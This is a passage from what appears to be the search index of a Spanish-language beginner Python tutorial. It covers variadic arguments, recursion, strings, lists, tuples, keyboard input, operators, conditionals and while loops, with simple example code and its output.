indeterminados_posicion ( * args ): for arg in args : print ( arg ) indeterminados_posicion ( 5 , \"Hola\" ,[ 1 , 2 , 3 , 4 , 5 ]) 5 Hola [1, 2, 3, 4, 5]","title":"Por posici\u00f3n"},{"location":"lenguajes/python3/fundamentos/funciones/#por-nombre","text":"Para recibir un n\u00famero indeterminado de par\u00e1metros por nombre (clave-valor), debemos crear un diccionario din\u00e1mico de argumentos: def indeterminados_nombre ( ** kwargs ): print ( kwargs ) indeterminados_nombre ( n = 5 , c = \"Hola\" , l = [ 1 , 2 , 3 , 4 , 5 ]) {'n': 5, 'c': 'Hola', 'l': [1, 2, 3, 4, 5]} def indeterminados_nombre ( ** kwargs ): for kwarg in kwargs : print ( kwarg ) indeterminados_nombre ( n = 5 , c = \"Hola\" , l = [ 1 , 2 , 3 , 4 , 5 ]) n c l def indeterminados_nombre ( ** kwargs ): for kwarg in kwargs : print ( kwarg , \" \" , kwargs [ kwarg ]) indeterminados_nombre ( n = 5 , c = \"Hola\" , l = [ 1 , 2 , 3 , 4 , 5 ]) n 5 c Hola l [1, 2, 3, 4, 5]","title":"Por nombre"},{"location":"lenguajes/python3/fundamentos/funciones/#por-posicion-y-nombre-a-la-vez","text":"Si queremos aceptar ambos tipos de par\u00e1metros simult\u00e1neamente, entonces debemos crear ambas colecciones din\u00e1micas: def super_funcion ( * args , ** kwargs ): t = 0 for arg in args : t += arg print ( \"Sumatorio indeterminado es\" , t ) for kwarg in kwargs : print ( kwarg , \" \" , kwargs [ kwarg ]) super_funcion ( 10 , 50 , - 1 , 1.56 , 10 , 20 , 300 , nombre = \"Hector\" , edad = 27 ) Sumatorio indeterinado es 390.56 nombre Hector edad 27","title":"Por posici\u00f3n y nombre a la vez"},{"location":"lenguajes/python3/fundamentos/funciones/#funciones-recursivas","text":"Se trata de funciones que se llaman a s\u00ed mismas durante su propia ejecuci\u00f3n. Funcionan de forma similar a las iteraciones, y debemos encargarnos de planificar el momento en que una funci\u00f3n recursiva deja de llamarse o tendremos una funci\u00f3n rescursiva infinita. Suele utilizarse para dividir una tarea en subtareas m\u00e1s simples de forma que sea m\u00e1s f\u00e1cil abordar el problema y solucionarlo.","title":"Funciones recursivas"},{"location":"lenguajes/python3/fundamentos/funciones/#ejemplo-sencillo-sin-retorno","text":"Cuenta regresiva hasta cero a partir de un n\u00famero: def cuenta_atras ( num ): num -= 1 if num > 0 : print ( num ) cuenta_atras ( num ) else : print ( \"Boooooooom!\" ) print ( \"Fin de la funci\u00f3n\" , num ) cuenta_atras ( 5 ) 4 3 2 1 Boooooooom! Fin de la funci\u00f3n 0 Fin de la funci\u00f3n 1 Fin de la funci\u00f3n 2 Fin de la funci\u00f3n 3 Fin de la funci\u00f3n 4","title":"Ejemplo sencillo sin retorno"},{"location":"lenguajes/python3/fundamentos/funciones/#ejemplo-con-retorno","text":"El factorial de un n\u00famero corresponde al producto de todos los n\u00fameros desde 1 hasta el propio n\u00famero: 3! = 1 x 2 x 3 = 6 5! = 1 x 2 x 3 x 4 x 5 = 120 def factorial ( num ): print ( \"Valor inicial ->\" , num ) if num > 1 : num = num * factorial ( num - 1 ) print ( \"valor final ->\" , num ) return num factorial ( 5 ) Valor inicial -> 5 Valor inicial -> 4 Valor inicial -> 3 Valor inicial -> 2 Valor inicial -> 1 valor final -> 1 valor final -> 2 valor final -> 6 valor final -> 24 valor final -> 120 120","title":"Ejemplo con retorno"},{"location":"lenguajes/python3/fundamentos/fundamento/","text":"Fundamentos Textos (cadenas de caracteres) Acepta car\u00e1cteres especiales como las tabulaciones /t o los saltos de l\u00ednea /n print ( \"Un texto \\t una tabulaci\u00f3n\" ) Un texto una tabulaci\u00f3n print ( \"Un texto \\n una nueva l\u00ednea\" ) Un texto una nueva l\u00ednea Para evitar los car\u00e1cteres especiales, debemos indicar que una cadena es cruda (raw) print ( r \"C:\\nombre\\directorio\" ) # r => raw (cruda) C:\\nombre\\directorio Podemos utilizar \"\"\" (triple comillas) para cadenas multil\u00ednea print ( \"\"\"Una l\u00ednea otra l\u00ednea otra l\u00ednea \\t una tabulaci\u00f3n\"\"\" ) Una l\u00ednea otra l\u00ednea otra l\u00ednea una tabulaci\u00f3n Tambi\u00e9n es posible utilizar la multiplicaci\u00f3n de cadenas diez_espacios = \" \" * 10 print ( diez_espacios + \"un texto a diez espacios\" ) un texto a diez espacios \u00cdndices en las cadenas Los \u00edndices nos permiten posicionarnos en un car\u00e1cter espec\u00edfico de una cadena. Representan un n\u00famero [\u00edndice], que empezando por el 0 indica el car\u00e1cter de la primera posici\u00f3n, y as\u00ed sucesivamente. palabra = \"Python\" palabra [ 0 ] # car\u00e1cter en la posici\u00f3n 0 'P' palabra [ 3 ] 'h' Slicing en las cadenas El slicing es una capacidad de las cadenas que devuelve un subconjunto o subcadena utilizando dos \u00edndices [inicio:fin]: El primer \u00edndice indica donde empieza la subcadena (se incluye el car\u00e1cter). El segundo \u00edndice indica donde acaba la subcadena (se excluye el car\u00e1cter). palabra = \"Python\" palabra [ 0 : 2 ] 'Py' palabra [ 2 :] 'thon' palabra [: 2 ] 'Py' cadena = \"zer\u00e9P nauJ,01\" # Voltear una cadena cadena_volteada = cadena [:: - 1 ] print ( cadena_volteada [ 3 :], \"ha sacado un\" , cadena_volteada [: 2 ], \"de nota.\" ) Juan P\u00e9rez ha sacado un 10 de nota. Para voltear una cadena r\u00e1pidamente utilizando slicing podemos utilizar un tercer \u00edndice -1: cadena[::-1] cadena = \"zer\u00e9P nauJ,01\" cadena_volteada = cadena [:: - 1 ] print ( cadena_volteada ) 10,Juan P\u00e9rez Las listas Tipo compuesto de dato que puede almacenar distintos valores (llamados \u00edtems) ordenados entre [ ] y separados con comas. numeros = [ 1 , 2 , 3 , 4 ] datos = [ 4 , \"Una cadena\" , - 15 , 3.14 , \"Otra cadena\" ] \u00cdndices y slicing Funcionan de una forma muy similar a las cadenas de caracteres. datos [ 0 ] 4 datos [ - 1 ] 'Otra cadena' Suma de listas Da como resultado una nueva lista que incluye todos los \u00edtems. numeros + [ 5 , 6 , 7 , 8 ] [1, 2, 3, 4, 5, 6, 7, 8] Son modificables A diferencia de las cadenas, en las listas s\u00ed podemos modificar sus \u00edtems utilizando \u00edndices: pares = [ 0 , 2 , 4 , 5 , 8 , 10 ] pares [ 3 ] = 6 print ( pares ) [0, 2, 4, 6, 8, 10] Integran funcionalidades internas Como el m\u00e9todo .append() para a\u00f1adir un \u00edtem al final de la lista pares . append ( 12 ) print ( pares ) [0, 2, 4, 6, 8, 10, 12] Y una peculiaridad, es que tambi\u00e9n aceptan asignaci\u00f3n con slicing para modificar varios \u00edtems en conjunto letras = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' ] print ( letras [: 3 ]) ['a', 'b', 'c'] letras [: 3 ] = [ 'A' , 'B' , 'C' ] print ( letras ) ['A', 'B', 'C', 'd', 'e', 'f'] Asignar una lista vac\u00eda equivale a borrar los \u00edtems de la lista o sublista letras [: 3 ] = [] print ( letras ) ['d', 'e', 'f'] letras = [] print ( letras ) [] La funci\u00f3n len() tambi\u00e9n funciona con las listas del mismo modo que en las cadenas: print ( len ( pares )) 8 Listas anidadas Podemos manipular f\u00e1cilmente este tipo de estructuras utilizando m\u00faltiples \u00edndices, como si nos refier\u00e9ramos a las filas y columnas de una tabla. a = [ 1 , 2 , 3 ] b = [ 4 , 5 , 6 ] c = [ 7 , 8 , 9 ] r = [ a , b , c ] print ( r ) [[1, 2, 3], [4, 5, 6], [7, 8, 9]] print ( r [ 0 ]) # Primera sublista [1, 2, 3] print ( r [ 0 ][ 0 ]) # Primera sublista, y de ella, primer \u00edtem 1 Matriz Diversas listas dentro de una lista se denomina Matriz. Modificare cada lista para que el ultimo n\u00famero sume el total de los primeros 3 n\u00fameros. matriz = [ [ 1 , 1 , 1 , 5 ], [ 2 , 2 , 2 , 7 ], [ 3 , 3 , 3 , 2 ], [ 4 , 4 , 4 , 13 ] ] matriz [ 0 ][ - 1 ] = sum ( matriz [ 0 ][: - 1 ]) matriz [ 1 ][ - 1 ] = sum ( matriz [ 1 ][: - 1 ]) matriz [ 2 ][ - 1 ] = sum ( matriz [ 2 ][: - 1 ]) matriz [ 3 ][ - 1 ] = sum ( matriz [ 3 ][: - 1 ]) print ( matriz ) [[1, 1, 1, 3], [2, 2, 2, 6], [3, 3, 3, 9], [4, 4, 4, 12]] Tupla Es un lista que no es modificable t = ( 2 , 8 , 10 , 20 ) t (2, 8, 10, 20) t [ 0 ] = 80 --------------------------------------------------------------------------- TypeError Traceback (most recent call last) <ipython-input-9-b7272d63ab5a> in <module>() ----> 1 t[0] = 80 TypeError: 'tuple' object does not support item assignment Tuplas con nombres Subclase de las tuplas utilizada para crear peque\u00f1as estructuras inmutables, parecidas a una clase y sus objetos pero mucho m\u00e1s simples. t = ( 20 , 40 , 60 ) t [ 0 ] 20 t [ - 1 ] 60 from collections import namedtuple Persona = namedtuple ( 'Persona' , 'nombre apellido edad' ) p = Persona ( nombre = \"Hector\" , apellido = \"Costa\" , edad = 27 ) p . nombre 'Hector' p . apellido 'Costa' p . edad 27 p Persona(nombre='Hector', apellido='Costa', edad=27) p [ 0 ] 'Hector' p [ 1 ] 'Costa' p [ - 1 ] 27 Al ser una tupla, no se puede modificar p . nombre = \"Hola\" --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) <ipython-input-91-5cd7aba08457> in <module>() ----> 1 p.nombre = \"Hola\" AttributeError: can't set attribute Leyendo valores por teclado Se consigue utilizando la instrucci\u00f3n input() que lee y devuelve una cadena: # Podemos mostrar un mensaje antes de leer el valor valor = input ( \"Introduce un valor: \" ) Introduce un valor: 100 # Aunque leemos un n\u00famero, en realidad es una cadena de texto valor # Una cadena y un n\u00famero no se pueden operar valor + 100 --------------------------------------------------------------------------- TypeError Traceback (most recent call last) <ipython-input-6-5071d551e583> in <module>() ----> 1 valor + 100 TypeError: Can't convert 'int' object to str implicitly De cadena a entero # La funci\u00f3n int() de entero, devuelve un n\u00famero entero a partir de una cadena valor = int ( valor ) print ( valor ) 500 valor + 1000 # Ahora ya es operable 1500 De cadena a flotante # La funci\u00f3n float() de flotante, devuelve un n\u00famero flotante a partir de una cadena valor = float ( input ( \"Introduce un n\u00famero decimal o entero: \" ) ) Introduce un n\u00famero decimal o entero: 3.14 print ( valor ) 3.14 Los operadores relacionales Sirven para comparar dos valores, dependiendo del resultado de la comparaci\u00f3n pueden devolver: Verdadero (True), si es cierta Falso (False), si no es cierta 3 == 2 # Igual que 3 != 2 # Distinto de 3 > 2 # Mayor que 3 < 2 # Menor que 3 >= 4 # Mayor o igual que 3 <= 4 # Menor o igual que Tambi\u00e9n podemos comparar variables a = 10 b = 5 a > b True Y otros tipos, como cadenas, listas, el resultado de algunas funciones o los propios tipos l\u00f3gicos \"Hola\" == \"Hola\" True \"Hola\" != \"Hola\" False c = \"Hola\" c [ 0 ] == \"H\" True l1 = [ 0 , 1 , 2 ] l2 = [ 2 , 3 , 4 ] l1 == l2 False La representaci\u00f3n aritm\u00e9tica de True y False equivale a 1 y 0 respectivamente True == 1 # True False == 0 # True Operadores de asignaci\u00f3n Act\u00faan directamente sobre la variable actual modificando su valor. a += 5 # suma en asignaci\u00f3n a -= 10 # resta en asignaci\u00f3n a *= 2 # producto en asignaci\u00f3n a /= 2 # divisi\u00f3n en asignaci\u00f3n a %= 2 # m\u00f3dulo en asignaci\u00f3n a **= 5 # potencia en asignaci\u00f3n Condiciones Sentencia If Permite dividir el flujo de un programa en diferentes caminos. El if se ejecuta siempre que la expresi\u00f3n que comprueba devuelva True if True : # equivale a if not False print ( \"Se cumple la condici\u00f3n\" ) print ( \"Tambi\u00e9n se muestre este print\" ) Se cumple la condici\u00f3n Tambi\u00e9n se muestre este print Tambi\u00e9n permite anidar If dentro de If a = 5 b = 10 if a == 5 : print ( \"a vale\" , a ) if b == 10 : print ( \"y b vale\" , b ) a vale 5 y b vale 10 Como condici\u00f3n podemos evaluar m\u00faltiples expresiones, siempre que \u00e9stas devuelvan True o False if a == 5 and b == 10 : print ( \"a vale 5 y b vale 10\" ) a vale 5 y b vale 10 Sentencia Else Se encadena a un If para comprobar el caso contrario (en el que no se cumple la condici\u00f3n). n = 11 if n % 2 == 0 : print ( n , \"es un n\u00famero par\" ) else : print ( n , \"es un n\u00famero impar\" ) 11 es un n\u00famero impar Sentencia Elif Se encadena a un if u otro elif para comprobar m\u00faltiples condiciones, siempre que las anteriores no se ejecuten. nota = float ( input ( \"Introduce una nota: \" )) if nota >= 9 : print ( \"Sobresaliente\" ) elif nota >= 7 and nota < 9 : print ( \"Notable\" ) elif nota >= 6 and nota < 7 : print ( \"Bien\" ) elif nota >= 5 and nota < 6 : print ( \"Suficiente\" ) else : print ( \"Insuficiente\" ) Introduce una nota: 8 Notable Instrucci\u00f3n Pass Sirve para finalizar un bloque, se puede utilizar en un bloque vac\u00edo. if True : pass Iteraciones Iterar significa realizar una acci\u00f3n varias veces. Cada vez que se repite se denomina iteraci\u00f3n. While Se basa en repetir un bloque a partir de evaluar una condici\u00f3n l\u00f3gica, siempre que \u00e9sta sea True. Queda en las manos del programador decidir el momento en que la condici\u00f3n cambie a False para hacer que el While finalice. c = 0 while c <= 5 : c += 1 print ( \"c vale\" , c ) c vale 1 c vale 2 c vale 3 c vale 4 c vale 5 c vale 6 Else en bucle While Se encadena al While para ejecutar un bloque de c\u00f3digo una vez la condici\u00f3n ya no devuelve True (normalmente al final). c = 0 while c <= 5 : c += 1 print ( \"c vale\" , c ) else : print ( \"Se ha completado toda la iteraci\u00f3n y c vale\" , c ) c vale 1 c vale 2 c vale 3 c vale 4 c vale 5 c vale 6 Se ha completado toda la iteraci\u00f3n y c vale 6 Break Sirve para \"romper\" la ejecuci\u00f3n del While en cualquier momento. No se ejecutar\u00e1 el Else, ya que \u00e9ste s\u00f3lo se llama al finalizar la iteraci\u00f3n. c = 0 while c <= 5 : c += 1 if ( c == 4 ): print ( \"Rompemos el bucle cuando c vale\" , c ) break print ( \"c vale\" , c ) else : print ( \"Se ha completado toda la iteraci\u00f3n y c vale\" , c ) c vale 1 c vale 2 c vale 3 Rompemos el bucle cuando c vale 4 Instrucci\u00f3n Continue Sirve para \"saltarse\" la iteraci\u00f3n actual sin romper el bucle. c = 0 while c <= 5 : c += 1 if c == 3 or c == 4 : # print(\"Continuamos con la siguiente iteraci\u00f3n\",c) continue print ( \"c vale\" , c ) else : print ( \"Se ha completado toda la iteraci\u00f3n y c vale\" , c ) c vale 1 c vale 2 c vale 5 c vale 6 Se ha completado toda la iteraci\u00f3n y c vale 6 men\u00fa interactivo print ( \"Bienvenido al men\u00fa interactivo\" ) while ( True ): print ( \"\"\"\u00bfQu\u00e9 quieres hacer? Escribe una opci\u00f3n 1) Saludar 2) Sumar dos n\u00fameros 3) Salir\"\"\" ) opcion = input () if opcion == '1' : print ( \"Hola, espero que te lo est\u00e9s pasando bien\" ) elif opcion == '2' : n1 = float ( input ( \"Introduce el primer n\u00famero: \" )) n2 = float ( input ( \"Introduce el segundo n\u00famero: \" )) print ( \"El resultado de la suma es: \" , n1 + n2 ) elif opcion == '3' : print ( \"\u00a1Hasta luego! Ha sido un placer ayudarte\" ) break else : print ( \"Comando desconocido, vuelve a intentarlo\" ) For for numero in numeros : # Para [variable] en [lista] print ( numero ) 1 2 3 4 Modificar \u00edtems de lista La forma correcta de hacerlo es haciendo referencia al \u00edndice de la lista en lugar de la variable: indice = 0 numeros = [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] for numero in numeros : numeros [ indice ] *= 10 indice += 1 print ( numeros ) [10, 20, 30, 40, 50, 60, 70, 80, 90, 100] Podemos utilizar la funci\u00f3n enumerate() para conseguir el \u00edndice y el valor en cada iteraci\u00f3n f\u00e1cilmente: numeros = [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] for indice , numero in enumerate ( numeros ): numeros [ indice ] *= 10 numeros [10, 20, 30, 40, 50, 60, 70, 80, 90, 100] La funci\u00f3n range() Sirve para generar una lista de n\u00fameros que podemos recorrer f\u00e1cilmente, pero no ocupa memoria porque se interpreta sobre la marcha: for i in range ( 10 ): print ( i ) 0 1 2 3 4 5 6 7 8 9 Si queremos conseguir la lista literal podemos transformar el range a una lista: print ( list ( range ( 10 )) ) [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] Si queremos conseguir la suma de todos los numeros pares del 0 al 100 suma = sum ( range ( 0 , 101 , 2 ) ) print ( suma ) 2550","title":"Fundamentos"},{"location":"lenguajes/python3/fundamentos/fundamento/#fundamentos","text":"","title":"Fundamentos"},{"location":"lenguajes/python3/fundamentos/fundamento/#textos-cadenas-de-caracteres","text":"Acepta car\u00e1cteres especiales como las tabulaciones /t o los saltos de l\u00ednea /n print ( \"Un texto \\t una tabulaci\u00f3n\" ) Un texto una tabulaci\u00f3n print ( \"Un texto \\n una nueva l\u00ednea\" ) Un texto una nueva l\u00ednea Para evitar los car\u00e1cteres especiales, debemos indicar que una cadena es cruda (raw) print ( r \"C:\\nombre\\directorio\" ) # r => raw (cruda) C:\\nombre\\directorio Podemos utilizar \"\"\" (triple comillas) para cadenas multil\u00ednea print ( \"\"\"Una l\u00ednea otra l\u00ednea otra l\u00ednea \\t una tabulaci\u00f3n\"\"\" ) Una l\u00ednea otra l\u00ednea otra l\u00ednea una tabulaci\u00f3n Tambi\u00e9n es posible utilizar la multiplicaci\u00f3n de cadenas diez_espacios = \" \" * 10 print ( diez_espacios + \"un texto a diez espacios\" ) un texto a diez espacios","title":"Textos (cadenas de caracteres)"},{"location":"lenguajes/python3/fundamentos/fundamento/#indices-en-las-cadenas","text":"Los \u00edndices nos permiten posicionarnos en un car\u00e1cter espec\u00edfico de una cadena. Representan un n\u00famero [\u00edndice], que empezando por el 0 indica el car\u00e1cter de la primera posici\u00f3n, y as\u00ed sucesivamente. palabra = \"Python\" palabra [ 0 ] # car\u00e1cter en la posici\u00f3n 0 'P' palabra [ 3 ] 'h'","title":"\u00cdndices en las cadenas"},{"location":"lenguajes/python3/fundamentos/fundamento/#slicing-en-las-cadenas","text":"El slicing es una capacidad de las cadenas que devuelve un subconjunto o subcadena utilizando dos \u00edndices [inicio:fin]: El primer \u00edndice indica donde empieza la subcadena (se incluye el car\u00e1cter). El segundo \u00edndice indica donde acaba la subcadena (se excluye el car\u00e1cter). palabra = \"Python\" palabra [ 0 : 2 ] 'Py' palabra [ 2 :] 'thon' palabra [: 2 ] 'Py' cadena = \"zer\u00e9P nauJ,01\" # Voltear una cadena cadena_volteada = cadena [:: - 1 ] print ( cadena_volteada [ 3 :], \"ha sacado un\" , cadena_volteada [: 2 ], \"de nota.\" ) Juan P\u00e9rez ha sacado un 10 de nota. Para voltear una cadena r\u00e1pidamente utilizando slicing podemos utilizar un tercer \u00edndice -1: cadena[::-1] cadena = \"zer\u00e9P nauJ,01\" cadena_volteada = cadena [:: - 1 ] print ( cadena_volteada ) 10,Juan P\u00e9rez","title":"Slicing en las cadenas"},{"location":"lenguajes/python3/fundamentos/fundamento/#las-listas","text":"Tipo compuesto de dato que puede almacenar distintos valores (llamados \u00edtems) ordenados entre [ ] y separados con comas. numeros = [ 1 , 2 , 3 , 4 ] datos = [ 4 , \"Una cadena\" , - 15 , 3.14 , \"Otra cadena\" ]","title":"Las listas"},{"location":"lenguajes/python3/fundamentos/fundamento/#indices-y-slicing","text":"Funcionan de una forma muy similar a las cadenas de caracteres. datos [ 0 ] 4 datos [ - 1 ] 'Otra cadena'","title":"\u00cdndices y slicing"},{"location":"lenguajes/python3/fundamentos/fundamento/#suma-de-listas","text":"Da como resultado una nueva lista que incluye todos los \u00edtems. numeros + [ 5 , 6 , 7 , 8 ] [1, 2, 3, 4, 5, 6, 7, 8]","title":"Suma de listas"},{"location":"lenguajes/python3/fundamentos/fundamento/#son-modificables","text":"A diferencia de las cadenas, en las listas s\u00ed podemos modificar sus \u00edtems utilizando \u00edndices: pares = [ 0 , 2 , 4 , 5 , 8 , 10 ] pares [ 3 ] = 6 print ( pares ) [0, 2, 4, 6, 8, 10]","title":"Son modificables"},{"location":"lenguajes/python3/fundamentos/fundamento/#integran-funcionalidades-internas","text":"Como el m\u00e9todo .append() para a\u00f1adir un \u00edtem al final de la lista pares . append ( 12 ) print ( pares ) [0, 2, 4, 6, 8, 10, 12] Y una peculiaridad, es que tambi\u00e9n aceptan asignaci\u00f3n con slicing para modificar varios \u00edtems en conjunto letras = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' ] print ( letras [: 3 ]) ['a', 'b', 'c'] letras [: 3 ] = [ 'A' , 'B' , 'C' ] print ( letras ) ['A', 'B', 'C', 'd', 'e', 'f'] Asignar una lista vac\u00eda equivale a borrar los \u00edtems de la lista o sublista letras [: 3 ] = [] print ( letras ) ['d', 'e', 'f'] letras = [] print ( letras ) [] La funci\u00f3n len() tambi\u00e9n funciona con las listas del mismo modo que en las cadenas: print ( len ( pares )) 8","title":"Integran funcionalidades internas"},{"location":"lenguajes/python3/fundamentos/fundamento/#listas-anidadas","text":"Podemos manipular f\u00e1cilmente este tipo de estructuras utilizando m\u00faltiples \u00edndices, como si nos refier\u00e9ramos a las filas y columnas de una tabla. a = [ 1 , 2 , 3 ] b = [ 4 , 5 , 6 ] c = [ 7 , 8 , 9 ] r = [ a , b , c ] print ( r ) [[1, 2, 3], [4, 5, 6], [7, 8, 9]] print ( r [ 0 ]) # Primera sublista [1, 2, 3] print ( r [ 0 ][ 0 ]) # Primera sublista, y de ella, primer \u00edtem 1","title":"Listas anidadas"},{"location":"lenguajes/python3/fundamentos/fundamento/#matriz","text":"Diversas listas dentro de una lista se denomina Matriz. Modificare cada lista para que el ultimo n\u00famero sume el total de los primeros 3 n\u00fameros. matriz = [ [ 1 , 1 , 1 , 5 ], [ 2 , 2 , 2 , 7 ], [ 3 , 3 , 3 , 2 ], [ 4 , 4 , 4 , 13 ] ] matriz [ 0 ][ - 1 ] = sum ( matriz [ 0 ][: - 1 ]) matriz [ 1 ][ - 1 ] = sum ( matriz [ 1 ][: - 1 ]) matriz [ 2 ][ - 1 ] = sum ( matriz [ 2 ][: - 1 ]) matriz [ 3 ][ - 1 ] = sum ( matriz [ 3 ][: - 1 ]) print ( matriz ) [[1, 1, 1, 3], [2, 2, 2, 6], [3, 3, 3, 9], [4, 4, 4, 12]]","title":"Matriz"},{"location":"lenguajes/python3/fundamentos/fundamento/#tupla","text":"Es un lista que no es modificable t = ( 2 , 8 , 10 , 20 ) t (2, 8, 10, 20) t [ 0 ] = 80 --------------------------------------------------------------------------- TypeError Traceback (most recent call last) <ipython-input-9-b7272d63ab5a> in <module>() ----> 1 t[0] = 80 TypeError: 'tuple' object does not support item assignment","title":"Tupla"},{"location":"lenguajes/python3/fundamentos/fundamento/#tuplas-con-nombres","text":"Subclase de las tuplas utilizada para crear peque\u00f1as estructuras inmutables, parecidas a una clase y sus objetos pero mucho m\u00e1s simples. t = ( 20 , 40 , 60 ) t [ 0 ] 20 t [ - 1 ] 60 from collections import namedtuple Persona = namedtuple ( 'Persona' , 'nombre apellido edad' ) p = Persona ( nombre = \"Hector\" , apellido = \"Costa\" , edad = 27 ) p . nombre 'Hector' p . apellido 'Costa' p . edad 27 p Persona(nombre='Hector', apellido='Costa', edad=27) p [ 0 ] 'Hector' p [ 1 ] 'Costa' p [ - 1 ] 27 Al ser una tupla, no se puede modificar p . nombre = \"Hola\" --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) <ipython-input-91-5cd7aba08457> in <module>() ----> 1 p.nombre = \"Hola\" AttributeError: can't set attribute","title":"Tuplas con nombres"},{"location":"lenguajes/python3/fundamentos/fundamento/#leyendo-valores-por-teclado","text":"Se consigue utilizando la instrucci\u00f3n input() que lee y devuelve una cadena: # Podemos mostrar un mensaje antes de leer el valor valor = input ( \"Introduce un valor: \" ) Introduce un valor: 100 # Aunque leemos un n\u00famero, en realidad es una cadena de texto valor # Una cadena y un n\u00famero no se pueden operar valor + 100 --------------------------------------------------------------------------- TypeError Traceback (most recent call last) <ipython-input-6-5071d551e583> in <module>() ----> 1 valor + 100 TypeError: Can't convert 'int' object to str implicitly De cadena a entero # La funci\u00f3n int() de entero, devuelve un n\u00famero entero a partir de una cadena valor = int ( valor ) print ( valor ) 500 valor + 1000 # Ahora ya es operable 1500 De cadena a flotante # La funci\u00f3n float() de flotante, devuelve un n\u00famero flotante a partir de una cadena valor = float ( input ( \"Introduce un n\u00famero decimal o entero: \" ) ) Introduce un n\u00famero decimal o entero: 3.14 print ( valor ) 3.14","title":"Leyendo valores por teclado"},{"location":"lenguajes/python3/fundamentos/fundamento/#los-operadores-relacionales","text":"Sirven para comparar dos valores, dependiendo del resultado de la comparaci\u00f3n pueden devolver: Verdadero (True), si es cierta Falso (False), si no es cierta 3 == 2 # Igual que 3 != 2 # Distinto de 3 > 2 # Mayor que 3 < 2 # Menor que 3 >= 4 # Mayor o igual que 3 <= 4 # Menor o igual que Tambi\u00e9n podemos comparar variables a = 10 b = 5 a > b True Y otros tipos, como cadenas, listas, el resultado de algunas funciones o los propios tipos l\u00f3gicos \"Hola\" == \"Hola\" True \"Hola\" != \"Hola\" False c = \"Hola\" c [ 0 ] == \"H\" True l1 = [ 0 , 1 , 2 ] l2 = [ 2 , 3 , 4 ] l1 == l2 False La representaci\u00f3n aritm\u00e9tica de True y False equivale a 1 y 0 respectivamente True == 1 # True False == 0 # True","title":"Los operadores relacionales"},{"location":"lenguajes/python3/fundamentos/fundamento/#operadores-de-asignacion","text":"Act\u00faan directamente sobre la variable actual modificando su valor. a += 5 # suma en asignaci\u00f3n a -= 10 # resta en asignaci\u00f3n a *= 2 # producto en asignaci\u00f3n a /= 2 # divisi\u00f3n en asignaci\u00f3n a %= 2 # m\u00f3dulo en asignaci\u00f3n a **= 5 # potencia en asignaci\u00f3n","title":"Operadores de asignaci\u00f3n"},{"location":"lenguajes/python3/fundamentos/fundamento/#condiciones","text":"","title":"Condiciones"},{"location":"lenguajes/python3/fundamentos/fundamento/#sentencia-if","text":"Permite dividir el flujo de un programa en diferentes caminos. El if se ejecuta siempre que la expresi\u00f3n que comprueba devuelva True if True : # equivale a if not False print ( \"Se cumple la condici\u00f3n\" ) print ( \"Tambi\u00e9n se muestre este print\" ) Se cumple la condici\u00f3n Tambi\u00e9n se muestre este print Tambi\u00e9n permite anidar If dentro de If a = 5 b = 10 if a == 5 : print ( \"a vale\" , a ) if b == 10 : print ( \"y b vale\" , b ) a vale 5 y b vale 10 Como condici\u00f3n podemos evaluar m\u00faltiples expresiones, siempre que \u00e9stas devuelvan True o False if a == 5 and b == 10 : print ( \"a vale 5 y b vale 10\" ) a vale 5 y b vale 10","title":"Sentencia If"},{"location":"lenguajes/python3/fundamentos/fundamento/#sentencia-else","text":"Se encadena a un If para comprobar el caso contrario (en el que no se cumple la condici\u00f3n). n = 11 if n % 2 == 0 : print ( n , \"es un n\u00famero par\" ) else : print ( n , \"es un n\u00famero impar\" ) 11 es un n\u00famero impar","title":"Sentencia Else"},{"location":"lenguajes/python3/fundamentos/fundamento/#sentencia-elif","text":"Se encadena a un if u otro elif para comprobar m\u00faltiples condiciones, siempre que las anteriores no se ejecuten. nota = float ( input ( \"Introduce una nota: \" )) if nota >= 9 : print ( \"Sobresaliente\" ) elif nota >= 7 and nota < 9 : print ( \"Notable\" ) elif nota >= 6 and nota < 7 : print ( \"Bien\" ) elif nota >= 5 and nota < 6 : print ( \"Suficiente\" ) else : print ( \"Insuficiente\" ) Introduce una nota: 8 Notable","title":"Sentencia Elif"},{"location":"lenguajes/python3/fundamentos/fundamento/#instruccion-pass","text":"Sirve para finalizar un bloque, se puede utilizar en un bloque vac\u00edo. if True : pass","title":"Instrucci\u00f3n Pass"},{"location":"lenguajes/python3/fundamentos/fundamento/#iteraciones","text":"Iterar significa realizar una acci\u00f3n varias veces. Cada vez que se repite se denomina iteraci\u00f3n.","title":"Iteraciones"},{"location":"lenguajes/python3/fundamentos/fundamento/#while","text":"Se basa en repetir un bloque a partir de evaluar una condici\u00f3n l\u00f3gica, siempre que \u00e9sta sea True. Queda en las manos del programador decidir el momento en que la condici\u00f3n cambie a False para hacer que el While finalice. c = 0 while c <= 5 : c += 1 print ( \"c vale\" , c ) c vale 1 c vale 2 c vale 3 c vale 4 c vale 5 c vale 6","title":"While"},{"location":"lenguajes/python3/fundamentos/fundamento/#else-en-bucle-while","text":"Se encadena al While para ejecutar un bloque de c\u00f3digo una vez la condici\u00f3n ya no devuelve True (normalmente al final). c = 0 while c <= 5 : c += 1 print ( \"c vale\" , c ) else : print ( \"Se ha completado toda la iteraci\u00f3n y c vale\" , c ) c vale 1 c vale 2 c vale 3 c vale 4 c vale 5 c vale 6 Se ha completado toda la iteraci\u00f3n y c vale 6","title":"Else en bucle While"},{"location":"lenguajes/python3/fundamentos/fundamento/#break","text":"Sirve para \"romper\" la ejecuci\u00f3n del While en cualquier momento. No se ejecutar\u00e1 el Else, ya que \u00e9ste s\u00f3lo se llama al finalizar la iteraci\u00f3n. c = 0 while c <= 5 : c += 1 if ( c == 4 ): print ( \"Rompemos el bucle cuando c vale\" , c ) break print ( \"c vale\" , c ) else : print ( \"Se ha completado toda la iteraci\u00f3n y c vale\" , c ) c vale 1 c vale 2 c vale 3 Rompemos el bucle cuando c vale 4","title":"Break"},{"location":"lenguajes/python3/fundamentos/fundamento/#instruccion-continue","text":"Sirve para \"saltarse\" la iteraci\u00f3n actual sin romper el bucle. c = 0 while c <= 5 : c += 1 if c == 3 or c == 4 : # print(\"Continuamos con la siguiente iteraci\u00f3n\",c) continue print ( \"c vale\" , c ) else : print ( \"Se ha completado toda la iteraci\u00f3n y c vale\" , c ) c vale 1 